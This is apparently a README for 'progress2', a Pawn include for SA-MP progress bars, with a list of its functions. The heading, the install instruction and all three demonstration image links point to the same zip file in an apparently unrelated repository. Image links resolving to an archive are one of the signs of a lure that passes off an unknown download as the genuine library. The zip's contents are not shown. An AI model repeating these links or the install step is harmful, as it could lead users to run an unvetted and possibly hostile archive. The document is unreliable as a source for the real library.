# https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip

This include is based on textdraws to create progress bars similar to the game bars (health, armor, breath).

The original project belongs to Flávio Toribio, then Southclaws took over and created version 2.

In this version of the include I do several fixes and improvements to the entire code.
The design of the bar borders has been fully adjusted.
The code was cleaned up, simplified and any dependency on other scripts was removed.

## Installation

Download https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip and put it on /pawno/include.

Add the following line to the top of your GM or FilterScript:

```pawn
#include <progress2>
```

## Usage

You can use an editor inside the "filterscripts" folder to create your progress bars easily, or you can create them manually using the functions.

### Functions

* `CreatePlayerProgressBar(playerid, Float:x, Float:y, Float:width = 55.5, Float:height = 3.2, colour, Float:max = 100.0, direction = BAR_DIRECTION_RIGHT)`:
  * Creates a progress bar for a player.
* `DestroyPlayerProgressBar(playerid, barid)`:
  * Destroys a player's progress bar.
* `ShowPlayerProgressBar(playerid, barid)`:
  * Shows a player's progress bar to them.
* `HidePlayerProgressBar(playerid, barid)`:
  * Hides a player's progress bar from them.
* `IsValidPlayerProgressBar(playerid, barid)`:
  * Returns true if the input bar ID is valid and exists.
* `GetPlayerProgressBarPos(playerid, barid, &Float:x, &Float:y)`:
  * Returns the on-screen position of the specified progress bar.
* `SetPlayerProgressBarPos(playerid, barid, Float:x, Float:y)`:
  * Updates the position for a progress bar and re-renders it.
* `Float:GetPlayerProgressBarWidth(playerid, barid)`:
  * Returns the width of a progress bar.
* `SetPlayerProgressBarWidth(playerid, barid, Float:width)`:
  * Updates the width of a progress bar and re-renders it.
* `Float:GetPlayerProgressBarHeight(playerid, barid)`:
  * Returns the height of a progress bar.
* `SetPlayerProgressBarHeight(playerid, barid, Float:height)`:
  * Updates the height of a progress bar and re-renders it.
* `GetPlayerProgressBarColour(playerid, barid)`:
  * Returns the colour of a progress bar.
* `SetPlayerProgressBarColour(playerid, barid, colour)`:
  * Sets the colour of a progress bar.
* `Float:GetPlayerProgressBarMaxValue(playerid, barid)`:
  * Returns the maximum value of a progress bar.
* `SetPlayerProgressBarMaxValue(playerid, barid, Float:max)`:
  * Sets the maximum value that a progress bar represents.
* `Float:GetPlayerProgressBarValue(playerid, barid)`:
  * Returns the value a progress bar represents.
* `SetPlayerProgressBarValue(playerid, barid, Float:value)`:
  * Sets the value a progress bar represents.
* `GetPlayerProgressBarDirection(playerid, barid)`:
  * Returns the direction of a progress bar.
* `SetPlayerProgressBarDirection(playerid, barid, direction)`:
  * Updates the direction for a progress bar and re-renders it.

### Demonstration
![Bars 1](https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip)

![Bars 2](https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip)

![Bars 3](https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip)

